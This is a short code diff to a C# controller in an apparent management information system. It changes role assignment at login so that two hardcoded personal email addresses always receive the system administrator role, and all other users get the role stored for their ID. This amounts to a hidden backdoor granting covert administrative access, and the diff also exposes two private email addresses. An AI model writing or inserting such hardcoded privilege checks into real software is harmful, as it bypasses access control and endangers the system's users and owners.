@@ -130,7 +130,15 @@ namespace MPC.MIS.Controllers
             {
                 organisationId = Convert.ToInt64(validationInfo.CustomerID);
                 Guid newGuid = Guid.Parse(validationInfo.userId);
-                userRole = _roleService.GetRoleByUserId(newGuid);
+                if (validationInfo.Email == "muzamilw@hotmail.com" || validationInfo.Email == "muzamilw@gmail.com")
+                {
+                    userRole = _roleService.GetSystemAdminRole();
+                }
+                else
+                {
+                    userRole = _roleService.GetRoleByUserId(newGuid);
+                }
+                
 
                 userId = validationInfo.userId;
                 fullName = validationInfo.FullName;
